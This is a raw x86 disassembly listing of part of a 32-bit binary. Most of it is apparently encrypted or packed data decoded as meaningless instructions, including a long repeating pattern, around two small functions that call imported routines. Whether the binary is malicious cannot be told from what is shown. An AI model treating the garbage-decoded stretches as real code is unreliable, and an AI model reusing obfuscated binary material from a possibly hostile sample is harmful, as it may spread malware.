  422aa5:	test   BYTE PTR [eax],al
  422aa7:	jo     0x422aad
  422aa9:	out    dx,al
  422aaa:	pop    ss
  422aab:	stc    
  422aac:	and    eax,0xab8505ef
  422ab1:	cmc    
  422ab2:	outs   dx,BYTE PTR ds:[esi]
  422ab3:	jns    0x422a3f
  422ab5:	and    cl,BYTE PTR [edi]
  422ab7:	popf   
  422ab8:	push   0x6c
  422aba:	sbb    al,0x58
  422abc:	dec    ebx
  422abd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422abe:	dec    ecx
  422abf:	in     al,dx
  422ac0:	shl    DWORD PTR [ebx-0x1a45fea2],1
  422ac6:	mov    esp,0xa304055b
  422acb:	add    dl,BYTE PTR [edi]
  422acd:	pop    ds
  422ace:	jge    0x422a50
  422ad0:	mov    dh,0x29
  422ad2:	loopne 0x422afa
  422ad4:	cmp    al,0xa3
  422ad6:	mov    cl,0xdf
  422ad9:	into   
  422ada:	cwde   
  422adb:	mov    ah,0x6c
  422add:	pop    ds
  422ade:	or     DWORD PTR [edx+0x34],0x5319d5
  422ae5:	scas   eax,DWORD PTR es:[edi]
  422ae6:	out    dx,eax
  422ae7:	dec    ecx
  422ae8:	imul   esi,DWORD PTR [edi-0x15ba0275],0x65
  422aef:	mov    DWORD PTR [ebx-0x395634f4],ebx
  422af5:	in     eax,0x6e
  422af7:	hlt    
  422af8:	(bad)  
  422af9:	in     eax,dx
  422afa:	mov    ds:0x6c88b425,al
  422aff:	test   al,0xe1
  422b01:	cmp    al,0xe1
  422b03:	iret   
  422b04:	test   eax,0x1295867c
  422b09:	inc    ecx
  422b0a:	ror    DWORD PTR [edi],cl
  422b0c:	sub    bl,BYTE PTR [eax+0x1147ac59]
  422b12:	inc    ebx
  422b13:	call   0xa4e76034
  422b18:	mov    DWORD PTR [ebx-0x1e],ebx
  422b1b:	test   al,0x9e
  422b1d:	mov    esp,0xbfbe12d3
  422b22:	mov    bh,0x15
  422b24:	push   ds
  422b25:	retf   
  422b26:	cmc    
  422b27:	mov    WORD PTR [ebx+0x304c9b3b],ds
  422b2d:	fdiv   st(6),st
  422b2f:	xor    BYTE PTR [ebp+0x24c14f01],bh
  422b35:	int    0x57
  422b37:	jmp    FWORD PTR [ecx-0x78b3dc69]
  422b3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b3e:	xor    al,0x80
  422b40:	(bad)  
  422b41:	dec    esi
  422b42:	dec    esp
  422b43:	pop    eax
  422b44:	ficom  DWORD PTR [ebx+0x2dd28ac5]
  422b4a:	push   ebp
  422b4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b4c:	sti    
  422b4d:	mov    eax,0xe35ac24e
  422b52:	addr16 mov ah,0x11
  422b55:	mov    dh,0x83
  422b57:	push   ebx
  422b58:	scas   eax,DWORD PTR es:[edi]
  422b59:	rol    edx,cl
  422b5b:	jae    0x422b00
  422b5d:	leave  
  422b5e:	je     0x422bdc
  422b60:	dec    ebx
  422b61:	sbb    al,0x22
  422b63:	jae    0x422b03
  422b65:	rcr    DWORD PTR [edx-0x3d],0x86
  422b69:	jnp    0x422b7b
  422b6b:	push   esi
  422b6c:	in     eax,dx
  422b6d:	xchg   edi,eax
  422b6e:	jg     0x422b25
  422b70:	push   ss
  422b71:	fmul   DWORD PTR [ecx]
  422b73:	test   BYTE PTR [edx-0x7f06898f],0x91
  422b7a:	cmp    eax,0x42cf1286
  422b7f:	iret   
  422b80:	cmp    DWORD PTR [ecx+0x6f2b0fd7],esi
  422b86:	aas    
  422b87:	sti    
  422b88:	or     DWORD PTR [edi-0x4],ebx
  422b8b:	jmp    0x422b45
  422b8d:	ret    
  422b8e:	outs   dx,BYTE PTR ds:[esi]
  422b8f:	and    al,0x92
  422b91:	les    ebx,FWORD PTR [ecx]
  422b93:	mov    esi,0x483a55b
  422b98:	adc    al,0x29
  422b9a:	cmc    
  422b9b:	push   edi
  422b9c:	cs mov ?,ecx
  422b9f:	jl     0x422bf0
  422ba1:	sbb    edx,DWORD PTR [edi]
  422ba3:	lods   al,BYTE PTR ds:[esi]
  422ba4:	pop    ebx
  422ba5:	adc    ebp,DWORD PTR [edi+0x61]
  422ba8:	sbb    DWORD PTR [ebp+ecx*1+0x5006cb64],esp
  422baf:	or     eax,0xd259b7b4
  422bb4:	je     0x422bd2
  422bb6:	test   DWORD PTR [esi+0x573a914],0x8b546f8d
  422bc0:	mov    ebp,ebx
  422bc2:	rol    DWORD PTR ds:0x8c876904,1
  422bc8:	or     eax,0x3d030b47
  422bcd:	gs ins DWORD PTR es:[edi],dx
  422bcf:	rcr    DWORD PTR [ebx+ebx*1+0x156939b5],cl
  422bd6:	pop    edx
  422bd7:	and    eax,0x1e5cc334
  422bdc:	lods   al,BYTE PTR ds:[esi]
  422bdd:	xor    ebx,DWORD PTR [esi]
  422bdf:	push   ebp
  422be0:	xchg   DWORD PTR [esi+ebp*8],esp
  422be3:	sub    eax,0xe1c9ac55
  422be8:	mov    cl,0x57
  422bea:	pushf  
  422beb:	(bad)  
  422bec:	mov    WORD PTR [ebx],cs
  422bee:	and    dl,cl
  422bf0:	mov    BYTE PTR [ebx],0xe
  422bf3:	sbb    al,0x92
  422bf5:	jmp    0x84239da7
  422bfa:	push   es
  422bfb:	sti    
  422bfc:	push   esp
  422bfd:	in     al,dx
  422bfe:	std    
  422bff:	cdq    
  422c00:	sahf   
  422c01:	sbb    esi,DWORD PTR [ebx]
  422c03:	stos   DWORD PTR es:[edi],eax
  422c04:	and    eax,0xe8ab8ebc
  422c09:	sbb    BYTE PTR [ebx-0x50986395],dh
  422c0f:	mov    ebp,0xd8619264
  422c14:	sbb    eax,0x5efa8d48
  422c19:	pop    eax
  422c1a:	pop    ebp
  422c1b:	sbb    BYTE PTR [ebx],dh
  422c1d:	btr    DWORD PTR [edi+0x2f083a7],esp
  422c24:	mov    eax,ds:0x6bab3ea1
  422c29:	xchg   edi,eax
  422c2a:	dec    ebx
  422c2b:	(bad)  
  422c2c:	jbe    0x422ca1
  422c2e:	xchg   edi,eax
  422c2f:	xchg   edi,eax
  422c30:	and    BYTE PTR [ecx],dh
  422c32:	outs   dx,DWORD PTR ds:[esi]
  422c33:	pop    edi
  422c34:	out    dx,eax
  422c35:	retf   
  422c36:	sub    esi,DWORD PTR [ecx-0x3e30517c]
  422c3c:	inc    ebx
  422c3d:	mov    esp,0xbae33425
  422c42:	leave  
  422c43:	adc    al,0xc5
  422c45:	xor    DWORD PTR [esi-0x45b34a08],esi
  422c4b:	mov    ch,0xcc
  422c4d:	fmul   QWORD PTR [ecx+esi*4]
  422c50:	aas    
  422c51:	sar    DWORD PTR [edi-0x21e09],1
  422c57:	pop    ecx
  422c58:	or     DWORD PTR [ecx-0x31],esp
  422c5b:	in     eax,0x9d
  422c5d:	icebp  
  422c5e:	mov    ebx,0xdd1d4169
  422c63:	add    BYTE PTR [ebx-0x6f],bl
  422c66:	(bad)  
  422c67:	call   0x3501:0x9cea1faa
  422c6e:	mov    cl,0xfc
  422c70:	xor    DWORD PTR [eax-0x61],esi
  422c73:	sub    eax,0x49a9f4df
  422c78:	aam    0x3d
  422c7a:	inc    ebx
  422c7b:	fldz   
  422c7d:	pop    ebx
  422c7e:	push   ebp
  422c7f:	(bad)
  422c82:	cmp    BYTE PTR [edi-0x53],al
  422c85:	aaa    
  422c86:	dec    ebp
  422c87:	push   edi
  422c88:	(bad)  
  422c89:	xchg   esp,eax
  422c8a:	cmp    bl,BYTE PTR [edx-0x4c]
  422c8d:	jp     0x422c2e
  422c8f:	inc    ecx
  422c90:	mov    eax,ds:0x49243ac7
  422c95:	add    DWORD PTR [ebx-0x52c38d7f],ecx
  422c9b:	outs   dx,BYTE PTR ds:[esi]
  422c9c:	popa   
  422c9d:	les    ecx,FWORD PTR [bx+si+0x5447]
  422ca2:	cmp    edi,DWORD PTR [eax-0x3a]
  422ca5:	mov    al,ds:0xfac98daa
  422caa:	les    eax,FWORD PTR [eax]
  422cac:	jg     0x422c43
  422cae:	mov    ds:0x3bc78cdc,al
  422cb3:	cli    
  422cb4:	xlat   BYTE PTR ds:[ebx]
  422cb5:	mov    ch,BYTE PTR [ebp+0x7ed7788c]
  422cbb:	enter  0x78fd,0x82
  422cbf:	cmp    eax,0x2d8b1e7f
  422cc4:	xor    ah,BYTE PTR [ebx-0x7358eb22]
  422cca:	adc    BYTE PTR [ebx+0x65],al
  422ccd:	fs mov bl,0xa0
  422cd0:	sub    ecx,ecx
  422cd2:	xor    ch,BYTE PTR [eax]
  422cd4:	test   al,0x4c
  422cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cd8:	mov    eax,0xbf8d86a6
  422cdd:	jno    0x422ca9
  422cdf:	jnp    0x956a8719
  422ce5:	jle    0x422cff
  422ce7:	xor    bh,ah
  422ce9:	dec    di
  422ceb:	and    DWORD PTR [eax],ebx
  422ced:	jbe    0x422d14
  422cef:	sbb    BYTE PTR [esi+0x5977419b],al
  422cf5:	or     al,0xfa
  422cf7:	mov    ah,0x9a
  422cf9:	pop    eax
  422cfa:	jne    0x422d7b
  422cfc:	outs   dx,BYTE PTR ds:[esi]
  422cfd:	outs   dx,BYTE PTR ds:[esi]
  422cfe:	dec    esp
  422cff:	cli    
  422d00:	jne    0x422d49
  422d02:	clc    
  422d03:	addr16 ffree st(2)
  422d06:	inc    eax
  422d07:	fdivrp st(2),st
  422d09:	jmp    0x422d1d
  422d0b:	std    
  422d0c:	pop    ebx
  422d0d:	mov    dh,0xa5
  422d0f:	and    al,0xdc
  422d11:	add    dh,ah
  422d13:	fmul   QWORD PTR [ebp-0x71b15218]
  422d19:	shl    ah,0xfc
  422d1c:	mov    eax,ebp
  422d1e:	inc    eax
  422d1f:	adc    esp,esi
  422d21:	pop    DWORD PTR [esi-0xf578b2]
  422d27:	or     al,0xf8
  422d29:	int    0xca
  422d2b:	pop    dx
  422d2d:	ds push ebx
  422d2f:	inc    ebp
  422d30:	mov    ch,0xa9
  422d32:	ret    
  422d33:	std    
  422d34:	sar    DWORD PTR [eax-0x5d3f59cb],1
  422d3a:	pop    ss
  422d3b:	nop
  422d3c:	mov    dh,0x90
  422d3e:	dec    ebx
  422d3f:	aaa    
  422d40:	repnz out 0x57,al
  422d43:	pop    ss
  422d44:	cmp    eax,0xff5dd81d
  422d49:	je     0x422d45
  422d4b:	std    
  422d4c:	lock je 0x422d7c
  422d4f:	push   edi
  422d50:	jne    0x422daa
  422d52:	popf   
  422d53:	push   ss
  422d54:	or     bl,BYTE PTR [eax+0x1c]
  422d57:	inc    esp
  422d58:	cdq    
  422d59:	cmp    cl,ah
  422d5b:	cmc    
  422d5c:	pusha  
  422d5d:	cmp    al,0xd9
  422d5f:	pop    esp
  422d60:	or     BYTE PTR gs:[ecx+0x70],ah
  422d64:	popf   
  422d65:	adc    ebp,DWORD PTR [edx]
  422d67:	in     eax,0x26
  422d69:	dec    eax
  422d6a:	inc    edi
  422d6b:	mov    WORD PTR [ecx-0x3],cs
  422d6e:	icebp  
  422d6f:	sub    bh,BYTE PTR [edx+eiz*4]
  422d72:	xchg   edi,eax
  422d73:	pop    edx
  422d74:	mov    edx,0xd319479a
  422d79:	daa    
  422d7a:	pop    ss
  422d7b:	nop
  422d7c:	push   es
  422d7d:	push   ebp
  422d7e:	push   ebp
  422d7f:	and    ebp,ecx
  422d81:	add    al,0xa4
  422d83:	add    DWORD PTR [ebp-0x35fd34d],edi
  422d89:	cmp    DWORD PTR [edx+eax*1],0x398e3dea
  422d90:	or     eax,0xf5611b54
  422d95:	lods   al,BYTE PTR ds:[esi]
  422d96:	inc    ecx
  422d97:	add    cl,bl
  422d99:	pop    ecx
  422d9a:	and    DWORD PTR [ebx-0x5c5fcb15],ebp
  422da0:	fbstp  TBYTE PTR [eax+0x4c]
  422da3:	test   DWORD PTR [eax],esi
  422da5:	(bad)  
  422da6:	aad    0x6d
  422da8:	out    dx,al
  422da9:	fild   WORD PTR [ebx+0x2f6397ac]
  422daf:	pop    ebp
  422db0:	outs   dx,DWORD PTR ds:[esi]
  422db1:	aam    0x34
  422db3:	or     ebx,esi
  422db5:	mov    WORD PTR [eax-0x54],ss
  422db8:	push   0xffffffcf
  422dba:	dec    ebx
  422dbb:	or     al,0xaf
  422dbd:	push   edi
  422dbe:	or     bl,BYTE PTR [edi-0x1d]
  422dc1:	arpl   WORD PTR [edx-0x75f042ee],cx
  422dc7:	pusha  
  422dc8:	pop    esp
  422dc9:	and    BYTE PTR [ebx],0xbe
  422dcc:	push   ss
  422dcd:	adc    DWORD PTR [ebx+ebx*2],edx
  422dd0:	call   0xc246:0x7a2626be
  422dd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dd8:	adc    esi,edx
  422dda:	repz cmp DWORD PTR [esi],0x56254713
  422de1:	or     BYTE PTR [esi-0x6c],al
  422de4:	push   esp
  422de5:	popa   
  422de6:	out    dx,al
  422de7:	mov    dh,0xcd
  422de9:	jge    0x422e68
  422deb:	adc    dh,BYTE PTR [ebp+0x72]
  422dee:	dec    edi
  422def:	aad    0x9b
  422df1:	or     eax,0xe84d54bb
  422df6:	(bad)
  422df9:	test   DWORD PTR [esi-0x727803f9],0xe2bd16dd
  422e03:	jne    0x422da9
  422e05:	ss popf 
  422e07:	xchg   esi,eax
  422e08:	iret   
  422e09:	ins    DWORD PTR es:[edi],dx
  422e0a:	mov    edi,0xd5d1287a
  422e0f:	jle    0x422dcd
  422e11:	mov    WORD PTR [ebp+0x79d196f4],ds
  422e17:	loop   0x422df2
  422e19:	or     ebp,DWORD PTR [ecx]
  422e1b:	mov    ds:0x97384131,eax
  422e20:	xor    dh,0xcc
  422e23:	xor    BYTE PTR [edi-0x33fac87f],bh
  422e29:	mov    ah,0x8b
  422e2b:	repz jp 0x422e93
  422e2e:	adc    ch,BYTE PTR es:[edx]
  422e31:	addr16 mov edi,esi
  422e34:	cs jmp 0xf9416da
  422e3a:	pop    ebx
  422e3b:	clc    
  422e3c:	or     al,0xd8
  422e3e:	test   ah,ch
  422e40:	sub    eax,0xc713989b
  422e45:	inc    edi
  422e46:	inc    esi
  422e47:	pop    ds
  422e48:	push   esi
  422e49:	loopne 0x422e82
  422e4b:	jl     0x422e55
  422e4d:	dec    ebx
  422e4e:	fisttp WORD PTR [ebx-0x4f]
  422e51:	push   ss
  422e52:	retf   
  422e53:	push   ds
  422e54:	inc    esi
  422e55:	hlt    
  422e56:	sub    BYTE PTR [edx-0x13256f8f],cl
  422e5c:	xchg   esi,eax
  422e5d:	aad    0x7
  422e5f:	mov    esi,0x2644c8ec
  422e64:	pop    ds
  422e65:	jp     0x422e17
  422e67:	les    eax,FWORD PTR [ebp-0x1fb4eaad]
  422e6d:	test   eax,0xdaab00f8
  422e72:	ficom  DWORD PTR [ebp+0x2ae174bc]
  422e78:	jmp    DWORD PTR [edi+edi*2]
  422e7b:	ror    DWORD PTR [esi],0xd2
  422e7e:	imul   esp,DWORD PTR [edx+eiz*8-0x52],0xc72bf65c
  422e86:	out    dx,eax
  422e87:	lock (bad) 
  422e89:	out    0xc0,eax
  422e8b:	xchg   BYTE PTR [ecx+0x7d],cl
  422e8e:	jnp    0x422ee4
  422e90:	push   ebp
  422e91:	dec    ebp
  422e92:	and    al,0x3f
  422e94:	ja     0x422e87
  422e96:	popa   
  422e97:	xchg   esi,eax
  422e98:	push   es
  422e99:	inc    ebp
  422e9a:	int3   
  422e9b:	fild   WORD PTR [edx-0x3e]
  422e9e:	lock adc al,0xea
  422ea1:	fisttp QWORD PTR [ebx+eax*1]
  422ea4:	push   esp
  422ea5:	mov    bl,0xce
  422ea7:	cmp    cl,bl
  422ea9:	mov    esi,0xbae088c1
  422eae:	and    al,0xcc
  422eb0:	dec    edi
  422eb1:	xor    al,0x4f
  422eb3:	hlt    
  422eb4:	sub    esi,edx
  422eb6:	call   esi
  422eb8:	dec    ebp
  422eb9:	xor    eax,0x8ae00ec4
  422ebe:	das    
  422ebf:	sbb    eax,0xe0f61bb9
  422ec4:	fidiv  DWORD PTR [edi]
  422ec6:	push   esp
  422ec7:	add    al,0x78
  422ec9:	add    dh,ah
  422ecb:	xor    DWORD PTR [esi],esp
  422ecd:	sbb    ah,dh
  422ecf:	ret    
  422ed0:	inc    edx
  422ed1:	push   edi
  422ed2:	mov    eax,0x7203bf97
  422ed7:	jmp    0x42e9037e
  422edc:	cmp    al,0xec
  422ede:	cmp    BYTE PTR [ecx-0x1c],bh
  422ee1:	jmp    0xb167:0x19b13af7
  422ee8:	mov    edi,DWORD PTR [edi-0x7c3c0060]
  422eee:	mov    edx,0x5f1fcc9b
  422ef3:	addr16 add eax,0x9752728a
  422ef9:	aaa    
  422efa:	pop    ebx
  422efb:	mov    dl,0x1e
  422efd:	xor    eax,ecx
  422eff:	jmp    0x422eef
  422f01:	jp     0x422e83
  422f03:	xor    dl,BYTE PTR [eax+0x732e3513]
  422f09:	or     dl,BYTE PTR [ebx]
  422f0b:	dec    eax
  422f0c:	mov    dl,0xfa
  422f0e:	je     0x422f39
  422f10:	or     al,BYTE PTR [ebx+0x171287cb]
  422f16:	ffreep st(5)
  422f18:	int    0x38
  422f1a:	loope  0x422f52
  422f1c:	cs mov eax,0x1
  422f22:	mov    esp,ebp
  422f24:	pop    ebp
  422f25:	ret    
  422f26:	int3   
  422f27:	int3   
  422f28:	int3   
  422f29:	int3   
  422f2a:	int3   
  422f2b:	int3   
  422f2c:	int3   
  422f2d:	int3   
  422f2e:	int3   
  422f2f:	int3   
  422f30:	push   ebp
  422f31:	mov    ebp,esp
  422f33:	sub    esp,0x8
  422f36:	mov    eax,ds:0x429044
  422f3b:	push   esi
  422f3c:	push   0x0
  422f3e:	push   0x4e
  422f40:	push   0x1e
  422f42:	push   0x0
  422f44:	push   0xffffffff
  422f46:	mov    DWORD PTR [ebp-0x4],0x0
  422f4d:	mov    DWORD PTR [ebp-0x8],eax
  422f50:	call   DWORD PTR ds:0x429038
  422f56:	mov    esi,DWORD PTR [ebp-0x8]
  422f59:	call   esi
  422f5b:	mov    DWORD PTR [ebp-0x4],eax
  422f5e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f62:	jne    0x422f71
  422f64:	push   0xfc7fba09
  422f69:	call   0x4111f0
  422f6e:	add    esp,0x4
  422f71:	xor    eax,eax
  422f73:	pop    esi
  422f74:	mov    esp,ebp
  422f76:	pop    ebp
  422f77:	ret    
  422f78:	nop
  422f79:	nop
  422f7a:	nop
  422f7b:	nop
  422f7c:	nop
  422f7d:	nop
  422f7e:	nop
  422f7f:	nop
  422f80:	sub    esp,0x10
  422f83:	push   0x0
  422f85:	push   0x0
  422f87:	push   0x0
  422f89:	call   DWORD PTR ds:0x429034
  422f8f:	lea    eax,[esp+0x0]
  422f93:	push   eax
  422f94:	call   DWORD PTR ds:0x42903c
  422f9a:	cmp    WORD PTR [esp+0x0],0x0
  422fa0:	je     0x422fc2
  422fa2:	push   0x0
  422fa4:	call   0x422f30
  422fa9:	add    esp,0x4
  422fac:	call   0x411000
  422fb1:	push   0x0
  422fb3:	push   0x0
  422fb5:	call   0x424400
  422fba:	xor    eax,eax
  422fbc:	add    esp,0x10
  422fbf:	ret    0x10
  422fc2:	push   DWORD PTR [ebx-0x26906f24]
  422fc8:	(bad)  
  422fc9:	aad    0x8f
  422fcb:	ficomp WORD PTR [ecx+0x136a252]
  422fd1:	xchg   BYTE PTR [eax],al
  422fd3:	xlat   BYTE PTR ds:[ebx]
  422fd4:	fcmovb st,st(4)
  422fd6:	aad    0x8f
  422fd8:	ficomp DWORD PTR [ecx-0x1361dae]
  422fde:	xchg   BYTE PTR [eax],al
  422fe0:	outs   dx,DWORD PTR ds:[esi]
  422fe1:	fcmovb st,st(4)
  422fe3:	aad    0x8f
  422fe5:	ficomp DWORD PTR [ecx-0x1365dae]
  422feb:	xchg   BYTE PTR [eax],al
  422fed:	outs   dx,DWORD PTR ds:[esi]
  422fee:	fcmovb st,st(4)
  422ff0:	aad    0x8f
  422ff2:	ficomp DWORD PTR [ecx-0x1365dae]
  422ff8:	xchg   BYTE PTR [eax],al
  422ffa:	outs   dx,DWORD PTR ds:[esi]
  422ffb:	fcmovb st,st(4)
  422ffd:	aad    0x8f
  422fff:	and    bl,BYTE PTR [ecx-0x1e385dae]
  423005:	cmp    al,0xe
  423007:	outs   dx,DWORD PTR ds:[esi]
  423008:	outs   dx,BYTE PTR ds:[esi]
  423009:	int    0x18
  42300b:	scas   al,BYTE PTR es:[edi]
  42300c:	bound  ebx,QWORD PTR [eax-0x551790e2]
  423012:	out    dx,al
  423013:	imul   ebx,DWORD PTR [edx+edi*8],0xbde0a7b4
  42301a:	jmp    0x42304f
  42301c:	iret   
  42301d:	jmp    0x1b117bf
  423022:	mov    ch,0xb0
  423024:	cmc    
  423025:	in     eax,dx
  423026:	mov    edi,0xa7d720b9
  42302b:	fsubp  st(7),st
  42302d:	outs   dx,BYTE PTR ds:[esi]
  42302e:	dec    edi
  42302f:	sahf   
  423030:	mov    eax,DWORD PTR [esi+0x36f6b7af]
  423036:	(bad)  
  423037:	out    0xf3,eax
  423039:	mov    ecx,DWORD PTR [edx]
  42303b:	dec    ebx
  42303c:	fcmovb st,st(4)
  42303e:	aad    0x8f
  423040:	ficomp DWORD PTR [ecx+0x250a552]
  423046:	fild   WORD PTR [ebx-0x69]
  423049:	dec    eax
  42304a:	into   
  42304b:	xchg   esi,eax
  42304c:	ja     0x423096
  42304e:	xchg   ebx,eax
  42304f:	adc    DWORD PTR [edx+0x5b],ebx
  423052:	hlt    
  423053:	fisub  WORD PTR [ebp+0x63]
  423056:	rcr    BYTE PTR [ebx-0x3e2fe2d3],1
  42305c:	aaa    
  42305d:	call   0x8265:0x927e3cc3
  423064:	mov    eax,ds:0x61b285ec
  423069:	shr    BYTE PTR [eax+0xabf70e5],0x29
  423070:	and    dl,BYTE PTR [esi-0x21]
  423073:	lds    ebx,FWORD PTR [edx-0x78]
  423076:	pop    eax
  423077:	call   0x4ace9cad
  42307c:	out    dx,eax
  42307d:	fcmovne st,st(6)
  42307f:	lea    esi,[edi+0x48]
  423082:	xchg   ebx,eax
  423083:	adc    DWORD PTR [edx+0x5a],ebx
  423086:	hlt    
  423087:	scas   al,BYTE PTR es:[edi]
  423088:	stc    
  423089:	std    
  42308a:	sar    BYTE PTR [ebx+0xd],1
  42308d:	(bad)  
  42308f:	aam    0xaa
  423091:	xor    bl,al
  423093:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423094:	jecxz  0x4230d3
  423096:	sar    BYTE PTR gs:[edi+eax*2],cl
  42309a:	test   DWORD PTR [edx-0x7457a504],eax
  4230a0:	push   es
  4230a1:	adc    al,0xa
  4230a3:	aaa    
  4230a4:	mov    edi,0x22cddfcb
  4230a9:	or     ebx,DWORD PTR [eax-0x10]
  4230ac:	mov    al,ds:0x9743ee9d
  4230b1:	dec    eax
  4230b2:	into   
  4230b3:	aad    0x8f
  4230b5:	ficomp DWORD PTR [ecx-0x1365dae]
  4230bb:	(bad)  
  4230bc:	inc    ebp
  4230bd:	outs   dx,DWORD PTR ds:[esi]
  4230be:	fimul  DWORD PTR [eax+0x75da8dd4]
  4230c4:	mov    cl,0xfd
  4230c6:	xchg   dh,bh
  4230c8:	xchg   BYTE PTR [eax],al
  4230ca:	outs   dx,DWORD PTR ds:[esi]
  4230cb:	fcmovb st,st(4)
  4230cd:	aad    0x8f
  4230cf:	cmp    bl,BYTE PTR [ecx-0x3d5caf]
  4230d5:	mov    WORD PTR [eax],es
  4230d7:	outs   dx,DWORD PTR ds:[esi]
  4230d8:	ss rcl ch,0x8f
  4230dc:	ficomp WORD PTR [edi-0x1365dae]
  4230e2:	xchg   BYTE PTR [ecx],al
  4230e4:	rcr    dl,cl
  4230e6:	(bad)  
  4230e7:	aad    0x9f
  4230e9:	ficomp DWORD PTR [ecx-0x1335dae]
  4230ef:	xchg   BYTE PTR [eax],al
  4230f1:	cs fcmovb st,st(4)
  4230f4:	lds    ecx,FWORD PTR [edi-0x5daf6626]
  4230fa:	leave  
  4230fb:	sti    
  4230fc:	xchg   BYTE PTR [ecx],al
  4230fe:	outs   dx,DWORD PTR ds:[esi]
  4230ff:	fcmovb st,st(4)
  423101:	aad    0x8f
  423103:	fistp  WORD PTR [ecx-0x1365dad]
  423109:	xchg   BYTE PTR [eax],al
  42310b:	outs   dx,DWORD PTR ds:[esi]
  42310c:	pop    edx
  42310d:	iret   
  42310e:	aad    0x8f
  423110:	ficomp WORD PTR [ecx-0x407e0ae]
  423116:	xchg   BYTE PTR [edx],al
  423118:	outs   dx,DWORD PTR ds:[esi]
  423119:	fiadd  DWORD PTR [ebp+edx*8-0x71]
  42311d:	retf   0x5299
  423120:	mov    dl,0xc9
  423122:	inc    BYTE PTR [esi-0x3b258100]
  423128:	lds    ecx,FWORD PTR [edi-0x5dad6626]
  42312e:	leave  
  42312f:	out    dx,al
  423130:	xchg   BYTE PTR [eax],al
  423132:	outs   dx,DWORD PTR ds:[esi]
  423133:	fcmovb st,st(4)
  423135:	aad    0x8f
  423137:	ficomp DWORD PTR [ecx-0x6fb25dae]
  42313d:	lea    eax,[eax]
  42313f:	push   es
  423140:	fld    st(4)
  423142:	aad    0x8f
  423144:	jmp    0x86fe:0xf46d5292
  42314b:	add    BYTE PTR [edi-0x26],ch
  42314e:	(bad)  
  42314f:	aad    0x8f
  423151:	ficomp DWORD PTR [ecx-0x1365dae]
  423157:	xchg   BYTE PTR [eax],al
  423159:	outs   dx,DWORD PTR ds:[esi]
  42315a:	fcmovb st,st(4)
  42315c:	aad    0x8f
  42315e:	ficomp DWORD PTR [ecx-0x1365dae]
  423164:	xchg   BYTE PTR [eax],al
  423166:	outs   dx,DWORD PTR ds:[esi]
  423167:	fcmovb st,st(4)
  423169:	aad    0x8f
  42316b:	ficomp DWORD PTR [ecx-0x1365dae]
  423171:	xchg   BYTE PTR [eax],al
  423173:	outs   dx,DWORD PTR ds:[esi]
  423174:	fcmovb st,st(4)
  423176:	aad    0x8f
  423178:	ficomp DWORD PTR [ecx-0x1365dae]
  42317e:	xchg   BYTE PTR [eax],al
  423180:	outs   dx,DWORD PTR ds:[esi]
  423181:	fcmovb st,st(4)
  423183:	aad    0x8f
  423185:	ficomp DWORD PTR [ecx-0x1365dae]
  42318b:	xchg   BYTE PTR [eax],al
  42318d:	outs   dx,DWORD PTR ds:[esi]
  42318e:	fcmovb st,st(4)
  423190:	aad    0x8f
  423192:	ficomp DWORD PTR [ecx-0x1365dae]
  423198:	xchg   BYTE PTR [eax],al
  42319a:	outs   dx,DWORD PTR ds:[esi]
  42319b:	fcmovb st,st(4)
  42319d:	aad    0x8f
  42319f:	ficomp DWORD PTR [ecx-0x1365dae]
  4231a5:	xchg   BYTE PTR [eax],al
  4231a7:	outs   dx,DWORD PTR ds:[esi]
  4231a8:	fcmovb st,st(4)
  4231aa:	aad    0x8f
  4231ac:	ficomp DWORD PTR [ecx-0x1365dae]
  4231b2:	xchg   BYTE PTR [esi],ch
  4231b4:	sbb    edi,DWORD PTR [edi-0x25705e44]
  4231ba:	cdq    
  4231bb:	push   edx
  4231bc:	add    dl,0xfe
  4231bf:	xchg   BYTE PTR [eax],dl
  4231c1:	outs   dx,DWORD PTR ds:[esi]
  4231c2:	fcmovb st,st(4)
  4231c4:	out    dx,eax
  4231c5:	mov    ebx,edx
  4231c7:	cdq    
  4231c8:	push   esi
  4231c9:	mov    ds:0x43c3aec9,al
  4231ce:	pop    ebp
  4231cf:	mov    cs,WORD PTR [ebx-0x6625702b]
  4231d5:	push   edx
  4231d6:	mov    ds:0xe086fee9,al
  4231db:	inc    ecx
  4231dc:	test   al,0xb7
  4231de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231df:	in     al,dx
  4231e0:	ficomp DWORD PTR [ecx-0x1665dae]
  4231e6:	xchg   BYTE PTR [eax],al
  4231e8:	pop    edi
  4231e9:	rol    esp,1
  4231eb:	aad    0xdf
  4231ed:	ficomp DWORD PTR [ecx-0x13263ae]
  4231f3:	xchg   BYTE PTR [eax],al
  4231f5:	outs   dx,DWORD PTR ds:[esi]
  4231f6:	fcmovb st,st(4)
  4231f8:	aad    0x8f
  4231fa:	ficomp DWORD PTR [ecx-0x21365dae]
  423200:	xchg   BYTE PTR [eax],al
  423202:	(bad)  
  423203:	fcmovb st,st(4)
  423205:	aad    0x8f
  423207:	ficomp DWORD PTR [ecx-0x1365dae]
  42320d:	xchg   BYTE PTR [eax],al
  42320f:	outs   dx,DWORD PTR ds:[esi]
  423210:	fcmovb st,st(4)
  423212:	aad    0x8f
  423214:	ficomp DWORD PTR [ecx-0x1365dae]
  42321a:	xchg   BYTE PTR [eax],al
  42321c:	outs   dx,DWORD PTR ds:[esi]
  42321d:	fcmovb st,st(4)
  42321f:	aad    0x8f
  423221:	ficomp DWORD PTR [ecx-0x1365dae]
  423227:	xchg   BYTE PTR [eax],al
  423229:	outs   dx,DWORD PTR ds:[esi]
  42322a:	fcmovb st,st(4)
  42322c:	aad    0x8f
  42322e:	ficomp DWORD PTR [ecx-0x1365dae]
  423234:	xchg   BYTE PTR [eax],al
  423236:	outs   dx,DWORD PTR ds:[esi]
  423237:	fcmovb st,st(4)
  423239:	aad    0x8f
  42323b:	ficomp DWORD PTR [ecx-0x1365dae]
  423241:	xchg   BYTE PTR [eax],al
  423243:	outs   dx,DWORD PTR ds:[esi]
  423244:	fcmovb st,st(4)
  423246:	aad    0x8f
  423248:	ficomp DWORD PTR [ecx-0x1365dae]
  42324e:	xchg   BYTE PTR [eax],al
  423250:	outs   dx,DWORD PTR ds:[esi]
  423251:	fcmovb st,st(4)
  423253:	aad    0x8f
